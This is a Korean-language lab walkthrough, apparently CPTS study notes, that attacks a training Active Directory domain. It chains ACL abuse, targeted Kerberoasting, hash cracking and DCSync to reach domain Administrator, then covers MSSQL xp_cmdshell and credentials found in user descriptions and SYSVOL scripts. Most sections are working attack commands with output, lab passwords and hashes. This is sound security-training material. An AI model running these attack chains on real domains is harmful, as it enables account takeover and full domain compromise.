---
title: "Active Directory - ACL Abuse, Privileged Access and Misconfigurations"
date: 2026-08-06
layout: single
excerpt: "Active Directory 환경에서 ACL과 중첩 그룹 권한을 열거하고, ForceChangePassword, GenericWrite, GenericAll 권한을 연계해 DCSync로 이어지는 공격 경로를 실습한다. 또한 SQLAdmin 접근과 사용자 설명, SYSVOL 스크립트, AS-REP Roasting 등 잘못된 구성에서 자격 증명을 확보하는 과정을 정리한다."
author_profile: true
toc: true
toc_label: "Active Directory"
toc_icon: "book"
toc_sticky: true
categories: [cpts-infra]
tags: [cpts, active-directory, acl, dcsync, kerberos, misconfiguration]
---

Active Directory 환경에서 ACL과 중첩 그룹 권한을 열거하고, ForceChangePassword, GenericWrite, GenericAll 권한을 연계해 DCSync로 이어지는 공격 경로를 실습한다. 

또한 SQLAdmin 접근과 사용자 설명, SYSVOL 스크립트, AS-REP Roasting 등 잘못된 구성에서 자격 증명을 확보하는 과정을 정리한다.

# An ACE in the Hole

## ACL Enumeration

Active Directory에서는 사용자, 그룹, 컴퓨터 등 각 객체에 ACL(Access Control List)이 존재한다.

ACL은 여러 ACE(Access Control Entry)로 구성되며, 각 ACE는 특정 보안 주체가 해당 객체에 대해 어떤 권한을 가지는지를 정의한다.

ACL을 열거하는 방법은 여러 가지가 있으며, 여기서는 PowerView를 사용한다.

이전 모듈에서 확보한 `wley` 사용자를 기준으로 ACL 관계를 확인해보겠다.

먼저 `wley` 의 SID를 변수에 저장하였다:

```powershell
PS C:\Users\htb-student> $sid = Convert-NameToSid wley
```

이제 `wley` 가 어떤 AD 객체에 대해 어떤 권한을 가지고 있는지 확인할 수 있다:

```powershell
PS C:\Users\htb-student> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}

ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
ActiveDirectoryRights  : ExtendedRight
ObjectAceFlags         : ObjectAceTypePresent
ObjectAceType          : 00299570-246d-11d0-a768-00aa006e0529
InheritedObjectAceType : 00000000-0000-0000-0000-000000000000
BinaryLength           : 56
AceQualifier           : AccessAllowed
IsCallback             : False
OpaqueLength           : 0
AccessMask             : 256
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181
AceType                : AccessAllowedObject
AceFlags               : ContainerInherit
IsInherited            : False
InheritanceFlags       : ContainerInherit
PropagationFlags       : None
AuditFlags             : None
```

결과를 보면 대상 객체는 Dana Amundsen 이며, `wley` 에게 부여된 ACE의 `ObjectAceType` 값이 `00299570-246d-11d0-a768-00aa006e0529` 인 것을 확인할 수 있다.

이 GUID는 Microsoft의 [User-Force-Change-Password](https://learn.microsoft.com/en-us/windows/win32/adschema/r-user-force-change-password) 문서에서 확인할 수도 있고, PowerView의 `-ResolveGUIDs` 옵션을 사용해 사람이 읽을 수 있는 이름으로 변환할 수도 있다:

```powershell
PS C:\Users\htb-student> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 

AceQualifier           : AccessAllowed
ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Force-Change-Password
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0
```

확인 결과 해당 ACE는 `User-Force-Change-Password`, 즉 `wley` 가 Dana Amundsen의 현재 비밀번호를 몰라도 비밀번호를 강제로 재설정할 수 있는 권한이었다.

### Enumerating ACLs Across Users

특정 사용자 하나가 아니라 여러 AD 사용자 객체를 대상으로 ACL을 확인할 수도 있다.

먼저 도메인 사용자들의 `sAMAccountName` 을 파일로 저장한 뒤, 각 사용자 객체의 ACL을 순차적으로 조회한다.

사용자 목록은 다음과 같이 저장할 수 있다:

```powershell
PS C:\Users\htb-student> Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```

이후 `ad_users.txt` 에 저장된 계정을 순회하면서 `wley` 와 관련된 ACE를 확인할 수 있다:

```powershell
PS C:\Users\htb-student> foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}

Path                  : Microsoft.ActiveDirectory.Management.dll\ActiveDirectory:://RootDSE/CN=Dana 
                        Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
InheritanceType       : All
ObjectType            : 00299570-246d-11d0-a768-00aa006e0529
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : ObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : INLANEFREIGHT\wley
IsInherited           : False
InheritanceFlags      : ContainerInherit
PropagationFlags      : None
```

### Tracing the ACL Attack Path

이제 `wley` 의 ForceChangePassword 권한을 이용해 Dana Amundsen의 계정을 장악했다고 가정하고, Dana Amundsen이 추가로 어떤 객체에 권한을 가지는지 확인한다.

먼저 `damundsen` 의 SID를 기준으로 ACL을 열거하였다:

```powershell
PS C:\Users\htb-student> $sid2 = Convert-NameToSid damundsen
PS C:\Users\htb-student> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose

AceType               : AccessAllowed
ObjectDN              : CN=Help Desk Level 1,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite
OpaqueLength          : 0
ObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-4022
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1176
AccessMask            : 131132
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed
```

`Get-DomainGroup` 을 사용하여 Help Desk Level 1 그룹의 상위 그룹을 확인하였다:

```powershell
PS C:\Users\htb-student> Get-DomainGroup -Identity "Help Desk Level 1" | select memberof

memberof                                                                      
--------                                                                      
CN=Information Technology,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
```

결과를 보면 `Help Desk Level 1` 은 `Information Technology` 그룹의 멤버로 중첩되어 있다.

따라서 `Information Technology` 그룹 자체가 다른 객체에 어떤 권한을 가지는지도 계속 추적하였다:

```powershell
PS C:\Users\htb-student> $itgroupsid = Convert-NameToSid "Information Technology"
PS C:\Users\htb-student> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose

AceType               : AccessAllowed
ObjectDN              : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : GenericAll
OpaqueLength          : 0
ObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-1164
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-4016
AccessMask            : 983551
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed
```

그 결과 `Information Technology` 그룹이 Angela Dunn(`adunn`) 사용자 객체에 대해 `GenericAll` 권한을 가지고 있음을 확인할 수 있다.

다음으로 `adunn` 계정 자체가 도메인 객체에 대해 어떤 권한을 가지는지 확인하였다:

```powershell
PS C:\htb> $adunnsid = Convert-NameToSid adunn 
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose

AceQualifier           : AccessAllowed
ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1164
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1164
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0

# SKIP
```

출력에서는 `adunn` 에게 도메인 복제 관련 Extended Right가 부여되어 있음을 확인할 수 있다. 

DCSync은 일반적으로 `DS-Replication-Get-Changes` 와 `DS-Replication-Get-Changes-All` 같은 복제 권한의 조합을 확인해야 한다.

지금까지의 권한 관계를 정리하면 `wley → damundsen → Help Desk Level 1 → Information Technology → adunn → Domain Replication Rights` 흐름으로 이어진다. 

`damundsen` 이 `Help Desk Level 1` 에 들어가면 중첩 그룹 관계를 통해 `Information Technology` 의 권한을 상속받고, 그 결과 `adunn` 객체에 대한 `GenericAll` 을 활용할 수 있다.

이러한 ACL 경로는 PowerView로 직접 추적할 수도 있고, BloodHound를 사용하면 그래프 형태로 더 쉽게 확인할 수 있다.

## ACL Abuse Tactics

이제 위에서 확인한 ACL 관계를 실제로 악용해 권한을 확장해보겠다.

RDP 환경보다 로컬 도구 사용이 편하므로, 포트 포워딩과 `proxychains` 를 통해 내부 AD 환경에 접근하는 방식으로 진행한다.

### Force-Change Password Abuse

먼저 앞에서 확인한 것처럼 wley가 Dana Amundsen(`damundsen`)에 대해 비밀번호 재설정 권한을 가지고 있는지 다시 확인하였다:

```bash
$ proxychains bloodyAD --host 172.16.5.5 -u wley -p 'transporter@4' get object damundsen --attr distinguishedName,sAMAccountName

distinguishedName: CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
sAMAccountName: damundsen
```

ACL을 직접 조회하면 다음과 같이 `User-Force-Change-Password` 권한을 확인할 수 있다:

```bash
$ proxychains bloodyAD --host 172.16.5.5 -u wley -p 'transporter@4' get object damundsen --attr nTSecurityDescriptor --resolve-sd | grep -A2 'Trustee: wley'          

nTSecurityDescriptor.ACL.2.Trustee: wley
nTSecurityDescriptor.ACL.2.Right: CONTROL_ACCESS
nTSecurityDescriptor.ACL.2.ObjectType: User-Force-Change-Password
```

따라서 이 권한을 이용해 `damundsen` 의 비밀번호를 재설정할 수 있다.

다음과 같이 비밀번호를 변경하였다:

```bash
$ proxychains bloodyAD --host 172.16.5.5 -u wley -p 'transporter@4' set password damundsen 'Asdf1234@' 

[+] Password changed successfully!
```

변경한 비밀번호로 LDAP 인증이 가능한지 확인하였다:

```bash
$ proxychains nxc ldap 172.16.5.5 -u damundsen -p 'Asdf1234@'                                            

LDAP        172.16.5.5      389    ACADEMY-EA-DC01  [*] Windows 10 / Server 2019 Build 17763 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL)
LDAP        172.16.5.5      389    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\damundsen:Asdf1234@
```

인증이 성공했으므로 `damundsen` 계정을 정상적으로 사용할 수 있게 되었다.

### Nested Group Abuse

앞서 ACL 열거 결과에서 `damundsen` 은 `Help Desk Level 1` 그룹에 대해 `GenericWrite` 권한을 가지고 있었다.

이를 이용해 자신의 계정을 해당 그룹의 멤버로 추가하였다:

```bash
$ proxychains bloodyAD --host 172.16.5.5 -u damundsen -p 'Asdf1234@' add groupMember 'Help Desk Level 1' damundsen          

[+] damundsen added to Help Desk Level 1
```

그룹의 `member` 속성을 조회하면 `damundsen` 이 정상적으로 추가된 것을 확인할 수 있다:

```bash
$ proxychains bloodyAD --host 172.16.5.5 -u damundsen -p 'Asdf1234@' get object 'Help Desk Level 1' --attr member

# SKIP

CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL;
```

`Help Desk Level 1` 은 `Information Technology` 그룹에 중첩되어 있으므로, `damundsen` 은 결과적으로 `Information Technology` 의 유효 멤버가 된다.

그리고 `Information Technology` 는 `adunn` 사용자 객체에 `GenericAll` 을 가지고 있으므로, `damundsen` 은 `adunn` 의 속성을 수정할 수 있다.

### Targeted Kerberoasting

여기서는 이 권한을 Targeted Kerberoasting에 사용하기 위해 `adunn` 계정에 임의의 SPN을 추가하였다:

```bash
$ proxychains bloodyAD --host 172.16.5.5 -u damundsen -p 'Asdf1234@' set object adunn servicePrincipalName -v 'abc/abc'

[+] adunn's servicePrincipalName has been updated
```

SPN이 설정된 사용자 계정에 대해서는 도메인 인증 사용자라면 TGS를 요청할 수 있으므로, `GetUserSPNs` 로 `adunn` 의 서비스 티켓 해시를 요청하였다:

```bash
$ proxychains impacket-GetUserSPNs INLANEFREIGHT.LOCAL/wley:'transporter@4' -dc-ip 172.16.5.5 -request-user adunn 

ServicePrincipalName  Name   MemberOf                                                           PasswordLastSet             LastLogon                   Delegation 
--------------------  -----  -----------------------------------------------------------------  --------------------------  --------------------------  ----------
abc/abc               adunn  CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL  2022-03-01 14:29:08.246680  2022-03-02 15:12:58.114176             

[-] CCache file is not found. Skipping...

$krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/adunn*$0fa8c346a06b93bd10296f8d980f347b$c95a376f9e137328f908a9654e21e240bfd0549a5d7486237dad10dec6828960d8ca1981bd91cbddb0ef444a2e010b5ec2236c13a8f32f7dd1bb9afa8b3414f260e3c1cbba8beda02dedae393caaf134d7be15ff2c3491c00523765149aae9586af75ca40a86df285bc648488ae1cb4481ee21aa6c08a4296b84b7a56d951acc05223c7d61146fb3e8cdfe36bbb0763496976bde871dfc3346f2fddd04cb118fca209a7cd142e8b1bbd4b552c24f61d9beb130ec49960f9ab8c04fbc12dbb815992a0134189dd11641dd5d55d697df8336edb4d9e6cb448317d2ecf8c427c9a87e37e3b4a8ca57192087beb57216b1120a1e30b4b307c752f628962db7217aeb6a5c6b4ed84cb4741c663aee6c0f7fadfc8bb111f2e7557396ddade1bb81e4b350c6b2725341905dede8bff832c7453f48f2075f38d06a3d50dcde93693cf924d96dbf8c80c06dc3f2716d9216fbcfeaf53a3ab8db50a2b63ea7c4d451911928d0dac475ed53e567fedb24443da9ae1a1ce5f3173451d1004735f51913c4ea5dd60738e62e46b8227fba95ca62b86e107dbb4094e14c0de00c0bd5649d024433cd571de8864bd7257af1cbd21f6c10e15e916e33fdad92b222f7d3e4311a198ba207584f8d8038461e776e4962d11b234e7a914d7787a181c3f580354fbf66484df1a7c4532384fdd2aacb6f9d48396b9e33fceb3f5df699b13d29f46801478152284aedd928a4dc0955172be6cd23160d4215171ecb0b18db62d8b2b45f262a2cff4b6b2b25f2d8b4c29504fbde5de081cabf470a5c12caca966cd37e4c20c121a2c8148d633a4a00ec75de9ee4fa50c8fe8be3f4dabe7a3b104e8e17d1ac7387e07ada121a691b024f5a59477643f481761e43116f800be2ca99c2b20425e518ce9f90a8c453c1adbe8b67fafa1ac6f2e688e859fe27ec27ffa4356d1e4c36d322414194eb96f912b004db041ae772d017f2d5417b4df6dae5c45115e5e2df64211f7fd72a1f917b969e9c9e2415b23f7d9dcb0e017468c1f28fc974e189e037b7414cfbc0c3fab2140d5df2bf346d43e0c5c4388a3b6f2049e64034a41f4a44cb4a8435ea0b8f90056320ccbb1151f6df7b8d2ca29620fccd0cfd5283e1d55eb5a0d941b160a6f89b448f1f809f562b7559039e402a0f9fb03aff7fb1ac0e64d889c8b71fe2b2ae98e9f45d538119198d000fb6fd7895051ea742dd26096b6edffa959c2b8db5c868f03864cf5c20c4bfea329cc9af632a34716356f10f7c73f411fd7cfa37099d375d8f352971f4ae1e92e678fd43efc87f41b22db3a338b60b41c2336507c325e477b24c26d4b51dfb80f897e1b73fd5281461dc4663c27f0c82827123528fce3b781065a78d65a4c459d075f9b18467ade297eebfb4cf3a0945ee54d336086e2a3c12a79a9f96f408343a91b27fed59cc35fcda72984845c2bd738e1f6d28
```

획득한 TGS 해시는 오프라인에서 크랙할 수 있다:

```bash
hashcat -m 13100 '$krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/adunn*$0fa8c346a06b93bd10296f8d980f347b$c95a376f9e137328f908a9654e21e240bfd0549a5d7486237dad10dec6828960d8ca1981bd91cbddb0ef444a2e010b5ec2236c13a8f32f7dd1bb9afa8b3414f260e3c1cbba8beda02dedae393caaf134d7be15ff2c3491c00523765149aae9586af75ca40a86df285bc648488ae1cb4481ee21aa6c08a4296b84b7a56d951acc05223c7d61146fb3e8cdfe36bbb0763496976bde871dfc3346f2fddd04cb118fca209a7cd142e8b1bbd4b552c24f61d9beb130ec49960f9ab8c04fbc12dbb815992a0134189dd11641dd5d55d697df8336edb4d9e6cb448317d2ecf8c427c9a87e37e3b4a8ca57192087beb57216b1120a1e30b4b307c752f628962db7217aeb6a5c6b4ed84cb4741c663aee6c0f7fadfc8bb111f2e7557396ddade1bb81e4b350c6b2725341905dede8bff832c7453f48f2075f38d06a3d50dcde93693cf924d96dbf8c80c06dc3f2716d9216fbcfeaf53a3ab8db50a2b63ea7c4d451911928d0dac475ed53e567fedb24443da9ae1a1ce5f3173451d1004735f51913c4ea5dd60738e62e46b8227fba95ca62b86e107dbb4094e14c0de00c0bd5649d024433cd571de8864bd7257af1cbd21f6c10e15e916e33fdad92b222f7d3e4311a198ba207584f8d8038461e776e4962d11b234e7a914d7787a181c3f580354fbf66484df1a7c4532384fdd2aacb6f9d48396b9e33fceb3f5df699b13d29f46801478152284aedd928a4dc0955172be6cd23160d4215171ecb0b18db62d8b2b45f262a2cff4b6b2b25f2d8b4c29504fbde5de081cabf470a5c12caca966cd37e4c20c121a2c8148d633a4a00ec75de9ee4fa50c8fe8be3f4dabe7a3b104e8e17d1ac7387e07ada121a691b024f5a59477643f481761e43116f800be2ca99c2b20425e518ce9f90a8c453c1adbe8b67fafa1ac6f2e688e859fe27ec27ffa4356d1e4c36d322414194eb96f912b004db041ae772d017f2d5417b4df6dae5c45115e5e2df64211f7fd72a1f917b969e9c9e2415b23f7d9dcb0e017468c1f28fc974e189e037b7414cfbc0c3fab2140d5df2bf346d43e0c5c4388a3b6f2049e64034a41f4a44cb4a8435ea0b8f90056320ccbb1151f6df7b8d2ca29620fccd0cfd5283e1d55eb5a0d941b160a6f89b448f1f809f562b7559039e402a0f9fb03aff7fb1ac0e64d889c8b71fe2b2ae98e9f45d538119198d000fb6fd7895051ea742dd26096b6edffa959c2b8db5c868f03864cf5c20c4bfea329cc9af632a34716356f10f7c73f411fd7cfa37099d375d8f352971f4ae1e92e678fd43efc87f41b22db3a338b60b41c2336507c325e477b24c26d4b51dfb80f897e1b73fd5281461dc4663c27f0c82827123528fce3b781065a78d65a4c459d075f9b18467ade297eebfb4cf3a0945ee54d336086e2a3c12a79a9f96f408343a91b27fed59cc35fcda72984845c2bd738e1f6d28' /usr/share/wordlists/rockyou.txt
```

그 결과 `adunn` 의 비밀번호를 확인할 수 있었다:

```text
SyncMaster757
```

### DCSync Path

이제 `adunn` 의 자격 증명을 확보했으며, 앞에서 확인한 도메인 복제 권한 조합이 실제 DCSync에 충분하다면 `secretsdump` 등을 통해 도메인 계정의 NTLM 해시를 복제할 수 있다. 

아래에서는 그렇게 확보한 Administrator NTLM 해시가 정상적으로 인증되는지 확인하였다:

```bash
$ proxychains impacket-secretsdump -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/adunn@172.16.5.5'

# SKIP
```

확인 되었으며, 테스트 결과 다음과 같이 인증에 성공하였다:

```bash
$ proxychains nxc ldap 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf

LDAP        172.16.5.5      389    ACADEMY-EA-DC01  [*] Windows 10 / Server 2019 Build 17763 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL)
LDAP        172.16.5.5      389    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\administrator:88ad09182de639ccc6579eb0849751cf (Pwn3d!)
```

이처럼 Administrator 해시로 인증에 성공하고 `Pwn3d!` 가 표시되므로, 도메인 컨트롤러의 관리자 권한까지 이어졌음을 확인할 수 있다.

# Stacking The Deck 

## Privileged Access

앞에서는 ACL 체인을 통해 도메인 권한을 확장하는 흐름을 확인하였다.

### SQLAdmin Access

이번에는 BloodHound에서 `damundsen` 의 다른 공격 경로를 확인해보니 다음과 같은 `SQLAdmin` 관계가 존재하였다:

![Active Directory](/assets/cpts-infra/active-directory-acl-abuse-privileged-access-and-misconfigurations/ad1.png)

즉, `damundsen` 이 특정 컴퓨터에서 실행 중인 MSSQL 인스턴스에 관리 수준의 접근 권한을 가질 수 있음을 의미한다.

먼저 해당 SQLAdmin 엣지의 대상 컴퓨터가 무엇인지 SID를 기준으로 확인하였다:

SID를 조회한 결과는 다음과 같다:

```bash
$ proxychains bloodyAD --host 172.16.5.5 -u damundsen -p 'Asdf1234@' get object 'S-1-5-21-3842939050-3880317879-2865463114-5631' --attr objectSid,sAMAccountName

distinguishedName: CN=ACADEMY-EA-DB01,OU=Database,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
objectSid: S-1-5-21-3842939050-3880317879-2865463114-5631
sAMAccountName: ACADEMY-EA-DB01$
```

따라서 이 SID는 `ACADEMY-EA-DB01$` 컴퓨터 객체를 가리키며, BloodHound의 관계는 `damundsen → SQLAdmin → ACADEMY-EA-DB01` 로 이해하면 된다.

이제 해당 컴퓨터의 IP 주소를 DNS 정보에서 확인하였다:

```bash
$ proxychains bloodyAD --host 172.16.5.5 -u damundsen -p 'Asdf1234@' msldap dnsquery 'ACADEMY-EA-DB01' --zone INLANEFREIGHT.LOCAL

Tree: DC=INLANEFREIGHT.LOCAL,CN=MicrosoftDNS,DC=DomainDnsZones,DC=INLANEFREIGHT,DC=LOCAL
0400010005f0000059010000000004b0000000003b573800ac100596
==== DNS_RECORD ====
DataLength: 4
Type: A
Version: 05
Rank: 240
Flags: 0000
Serial: 345
TtlSeconds: 1200
Reserved: 00000000
TimeStamp: 3b573800
Data: ac100596

{'IpAddress': '172.16.5.150'}
```

조회 결과 `ACADEMY-EA-DB01` 의 IP 주소는 `172.16.5.150` 이었다.

따라서 `proxychains` 를 통해 해당 호스트의 MSSQL 서비스에 Windows 인증으로 접속하였다:

```bash
$ proxychains impacket-mssqlclient damundsen@172.16.5.150 -windows-auth
Password: Asdf1234@

SQL (INLANEFREIGHT\damundsen  dbo@master)>
```

### SQL Server Service Privileges

접속 후 xp_cmdshell을 활성화하고 SQL Server 서비스 계정의 Windows 권한을 확인하였다:

```bash
SQL (INLANEFREIGHT\damundsen  dbo@master)> enable_xp_cmdshell
INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.

SQL (INLANEFREIGHT\damundsen  dbo@master)> xp_cmdshell "whoami /priv"

PRIVILEGES INFORMATION                                                             
----------------------                                                             
Privilege Name                Description                               State      
============================= ========================================= ========   
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled  
```

`xp_cmdshell` 은 SQL Server 서비스 계정 컨텍스트에서 실행되며, 여기서는 `SeImpersonatePrivilege` 가 활성화되어 있다.

## Miscellaneous Misconfigurations

### Credentials in User Descriptions

AD 환경에서는 관리 편의를 위해 사용자 Description이나 공유 파일 등에 자격 증명을 남겨두는 잘못된 구성이 종종 존재한다.

특히 사용자 객체의 `Description` 속성에 비밀번호나 운영 메모가 평문으로 기록되어 있는 경우가 있다.

현재 내부 SSH 환경에서는 사용할 수 있는 도구가 제한적이므로, 포트 포워딩 후 로컬 환경에서 LDAP 열거를 진행하였다.

사용자 Description을 확인하면 다음과 같이 자격 증명이 노출된 계정을 찾을 수 있다:

```bash
$ proxychains nxc ldap 172.16.5.5 -u wley -p 'transporter@4' --users | awk '$1=="LDAP" && $6 ~ /^[0-9]{4}-/ && NF>8'

LDAP                     172.16.5.5      389    ACADEMY-EA-DC01  administrator                 2021-10-27 10:49:32 1        Built-in account for administering the computer/domain
LDAP                     172.16.5.5      389    ACADEMY-EA-DC01  krbtgt                        2021-10-27 11:14:34 0        Key Distribution Center Service Account
LDAP                     172.16.5.5      389    ACADEMY-EA-DC01  bross                         2021-10-27 13:37:07 3        HTB{LD@P_I$_W1ld}
LDAP                     172.16.5.5      389    ACADEMY-EA-DC01  ldap.agent                    2021-10-28 21:14:08 1        *** DO NOT CHANGE ***  3/12/2012: Sunsh1ne4All!
```

### Credentials in SMB and SYSVOL

SMB 공유에서도 설정 파일이나 스크립트에 남아 있는 자격 증명을 발견할 수 있다.

먼저 접근 가능한 SMB 공유를 열거하였다:

```bash
$ proxychains nxc smb 172.16.5.5 -u wley -p 'transporter@4' --shares                                             

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\wley:transporter@4 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Enumerated shares
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Share           Permissions     Remark
SMB         172.16.5.5      445    ACADEMY-EA-DC01  -----           -----------     ------
SMB         172.16.5.5      445    ACADEMY-EA-DC01  ADMIN$                          Remote Admin
SMB         172.16.5.5      445    ACADEMY-EA-DC01  C$                              Default share
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Department Shares READ            
SMB         172.16.5.5      445    ACADEMY-EA-DC01  IPC$            READ            Remote IPC
SMB         172.16.5.5      445    ACADEMY-EA-DC01  NETLOGON        READ            Logon server share 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  SYSVOL          READ            Logon server share 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  User Shares     READ            
SMB         172.16.5.5      445    ACADEMY-EA-DC01  ZZZ_archive     READ 
```

이 중 `SYSVOL` 은 도메인의 Group Policy 관련 파일과 로그온 스크립트 등이 저장되는 공유이며, 일반 도메인 사용자가 읽을 수 있는 경우가 많다.

따라서 `SYSVOL` 의 `scripts` 디렉터리를 확인하였다:

```text
smb: \INLANEFREIGHT.LOCAL\scripts\> ls
  .                                   D        0  Tue Mar  8 17:56:31 2022
  ..                                  D        0  Tue Mar  8 17:56:31 2022
  daily-runs.zip                      A      174  Thu Nov 18 13:44:59 2021
  disable-nbtns.ps1                   A      203  Tue Mar  1 00:11:55 2022
  Logon Banner.htm                    A   144138  Mon Mar  7 12:41:55 2022
  reset_local_admin_pass.vbs          A      979  Tue Mar  8 17:56:24 2022
```

여러 스크립트 중 특히 `reset_local_admin_pass.vbs` 파일이 눈에 띈다.

해당 파일을 다운로드하였다.

파일 내용을 확인하면 다음과 같다:

```text
On Error Resume Next
strComputer = "."
 
Set oShell = CreateObject("WScript.Shell") 
sUser = "Administrator"
sPwd = "!ILFREIGHT_L0cALADmin!"
 
Set Arg = WScript.Arguments
If  Arg.Count > 0 Then
sPwd = Arg(0) 'Pass the password as parameter to the script
End if
```

스크립트 내부에 로컬 Administrator 계정의 비밀번호가 평문으로 하드코딩되어 있음을 확인할 수 있다.

### AS-REP Roasting

또한 `DONT_REQ_PREAUTH` 플래그가 설정된 사용자 계정도 확인할 수 있다.

이 플래그가 설정된 계정은 Kerberos AS-REQ 단계에서 사전 인증을 요구하지 않으므로 AS-REP Roasting의 대상이 될 수 있다.

`GetNPUsers` 로 대상 계정을 열거하면 다음과 같다:

```bash
$ proxychains impacket-GetNPUsers 'inlanefreight.local/wley:transporter@4' -dc-ip 172.16.5.5

Name     MemberOf                                                           PasswordLastSet             LastLogon                   UAC      
-------  -----------------------------------------------------------------  --------------------------  --------------------------  --------
